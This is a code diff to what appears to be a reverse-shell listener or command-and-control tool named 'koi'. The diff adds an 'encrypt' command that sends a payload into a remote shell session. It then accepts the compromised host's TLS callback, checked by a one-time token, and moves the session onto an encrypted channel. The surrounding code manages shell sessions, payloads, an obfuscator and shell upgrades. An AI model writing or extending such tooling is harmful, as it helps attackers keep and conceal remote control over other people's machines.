@@ -10,6 +10,7 @@ import socket
 import subprocess
 import sys
 import threading
+import uuid
 import time
 from typing import Callable, Dict, Optional
 
@@ -29,6 +30,7 @@ from koi.utils.cli import (
 )
 from koi.utils.connect import TRANSPORTS, get_transport
 from koi.utils.powerupgrade import upgrade_windows_conptyshell
+from koi.utils.tls import server_context, is_tls_client_hello, try_tls_handshake, encrypt_payload
 from koi.utils.interact import interact
 from koi.utils.tcp import get_local_ip
 from koi.modules.loader import load_modules, get_module
@@ -175,6 +177,8 @@ class Listener:
         self._pending_conpty: dict = {}
         self._conpty_staging: dict = {}
         self._conpty_lock = threading.Lock()
+        self._pending_encrypt: dict = {}
+        self._ssl_ctx = None
         self.screenable_mode: bool = False
         self._winch_pending: bool = False
         self._stopped: bool = False
@@ -272,6 +276,31 @@ class Listener:
                     break
                 self._announce('error', f"Accept loop error, retrying: {exc}")
                 time.sleep(0.5)
+                continue
+
+            # Purge expired encrypt tokens.
+            now_mono = time.monotonic()
+            self._pending_encrypt = {
+                k: v for k, v in self._pending_encrypt.items()
+                if now_mono < v["deadline"]
+            }
+
+            # Peek to detect TLS ClientHello before any other routing.
+            tls_handled = False
+            if self._pending_encrypt and self._ssl_ctx is not None:
+                try:
+                    head = conn.recv(3, socket.MSG_PEEK)
+                except OSError:
+                    head = b""
+                if is_tls_client_hello(head):
+                    tls_conn = try_tls_handshake(conn, self._ssl_ctx)
+                    if tls_conn is not None:
+                        self._handle_encrypt_callback(tls_conn, addr)
+                        tls_handled = True
+                    else:
+                        conn.close()
+                        tls_handled = True
+            if tls_handled:
                 continue
 
             pending = self._pending_conpty.get(addr[0])
@@ -682,6 +711,7 @@ class Listener:
             "reload":     (self._cmd_reload, 0),
             "go":         (self._cmd_go, 1),
             "upgrade":    (self._cmd_upgrade, 1),
+            "encrypt":    (self._cmd_encrypt, 1),
             "kill":       (self._cmd_kill, 1),
             "payload":    (self._cmd_payload, 1),
             "obfuscator": (self._cmd_obfuscate, 1),
@@ -712,7 +742,8 @@ class Listener:
         for s in sorted(sessions, key=lambda x: x.id):
             masked_ip = self._mask_ip(s.addr[0])
             tag_part = f" {muted('[')}{accent(s.tag)}{muted(']')}" if s.tag else ""
-            key = f"#{s.id}{tag_part}  {s.status_dot()}  {plain(masked_ip)}{muted(f':{s.addr[1]}')}"
+            tls_badge = f"  {accent('TLS')}" if s.encrypted else ""
+            key = f"#{s.id}{tag_part}  {s.status_dot()}  {plain(masked_ip)}{muted(f':{s.addr[1]}')}{tls_badge}"
             data[key] = f"[{s.os_label()}]  {s._uptime()}"
         print_report_box("Sessions", data)
 
@@ -785,6 +816,85 @@ class Listener:
             logger.log_event("upgrade_done")
 
         notify('success', f"Shell {accent(f'#{sid}')} upgraded successfully.")
+
+    # ----------------------------------------------------------- encrypt (TLS)
+
+    _ENCRYPT_TIMEOUT = 30.0
+
+    def _handle_encrypt_callback(self, tls_conn, addr) -> None:
+        try:
+            tls_conn.settimeout(5.0)
+            line = b""
+            while not line.endswith(b"\n") and len(line) < 256:
+                chunk = tls_conn.recv(1)
+                if not chunk:
+                    tls_conn.close()
+                    return
+                line += chunk
+            token = line.strip().decode(errors="replace")
+        except (OSError, UnicodeDecodeError):
+            tls_conn.close()
+            return
+
+        entry = self._pending_encrypt.pop(token, None)
+        if entry is None:
+            tls_conn.close()
+            return
+
+        sess = entry["session"]
+        try:
+            sess.conn.close()
+        except OSError:
+            pass
+        sess.conn = tls_conn
+        sess.addr = addr
+        sess.encrypted = True
+        tls_conn.settimeout(None)
+
+    def _cmd_encrypt(self, ref: str) -> None:
+        sess = self._require_alive_session(ref)
+        if sess is None:
+            return
+        sid = sess.id
+        if sess.encrypted:
+            notify('warning', f"Session {accent(f'#{sid}')} is already encrypted.")
+            return
+
+        if self._ssl_ctx is None:
+            with Spinner("Generating TLS certificate..."):
+                try:
+                    self._ssl_ctx = server_context()
+                except Exception as exc:
+                    notify('error', f"Could not initialize TLS: {exc}")
+                    return
+
+        token = uuid.uuid4().hex
+        local_ip = get_local_ip(sess.addr[0])
+        payload = encrypt_payload(sess.os_type, local_ip, self.port, token)
+        if payload is None:
+            notify('error', f"No TLS payload for this session type.")
+            return
+
+        self._pending_encrypt[token] = {
+            "session": sess,
+            "deadline": time.monotonic() + self._ENCRYPT_TIMEOUT,
+        }
+
+        with sess.io(holder="encrypt"):
+            sess.send(payload.encode())
+
+        notify('info', f"TLS payload sent to {accent(f'#{sid}')}, waiting for callback...")
+
+        deadline = time.monotonic() + self._ENCRYPT_TIMEOUT
+        while time.monotonic() < deadline:
+            if sess.encrypted:
+                notify('success', f"Session {accent(f'#{sid}')} encrypted (TLS)")
+                return
+            time.sleep(0.3)
+
+        self._pending_encrypt.pop(token, None)
+        if not sess.encrypted:
+            notify('error', f"TLS callback from {accent(f'#{sid}')} timed out.")
 
     def _cmd_kill(self, ref: str) -> None:
         sess = self._resolve_session(ref)
